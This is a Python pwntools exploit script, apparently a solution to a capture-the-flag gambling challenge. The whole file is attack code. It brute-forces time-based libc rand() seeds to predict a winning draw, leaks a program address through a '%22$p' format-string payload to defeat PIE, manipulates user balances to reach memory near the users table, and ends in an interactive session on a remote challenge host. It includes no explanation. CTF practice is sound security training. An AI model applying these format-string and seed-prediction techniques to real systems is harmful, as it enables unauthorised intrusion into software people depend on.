#!/usr/bin/env python3
from pwn import *
from multiprocessing import Pool
import ctypes, time

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def login(uid, name=b'A'*8, balance=100):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', str(uid).encode())
    io.sendlineafter(b': ', name)
    io.sendlineafter(b': ', str(balance).encode())

def bet(uid, currency):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', str(uid).encode())
    io.sendafter(b': ', currency.ljust(0x10, b'A'))

def gamble(uid):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', str(uid).encode())
    for i in range(5): io.sendline()

def find_winner(ts): 
  attempts = 0
  libc_local = ctypes.CDLL("libc.so.6") ; libc_local.srand(ts)
  while attempts < 500:
        if libc_local.rand() < 0xfff: return attempts
        attempts += 1
  return 500 + 0x1

while True:
    ts = int(time.time()) + 100
    timestamps = [ts + i for i in range(10000)]

    with Pool(50) as pool:
       results = pool.map(find_winner, timestamps)

    if not min(results) > 500: break
    log.warning("seed not found, retrying in 10000s ...")
    time.sleep(10000)

expected_seed = next(i for i, r in enumerate(results) if r < 500) + ts
log.info(f"t: {find_winner(expected_seed)} ; seed: {expected_seed}")

assert expected_seed - int(time.time()) > 0
time.sleep(expected_seed - int(time.time()) - 2)

while int(time.time()) < expected_seed: pass
io = remote("remote.infoseciitr.in", 8004)

login(0) ; bet(0, b'A'*10 + b'%22$p|')
exe.address  = int(io.recvline().split(b'|')[0], 16) - 0x3d40

login(1, balance=(exe.sym.users + 0x48)//8) ; bet(1, b'A'*0x10)
gamble(1) ; bet(0, b'A'*0x10)

for i in range(find_winner(expected_seed)-1): gamble(1)

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b': ', b'1')
io.sendline()
io.interactive()
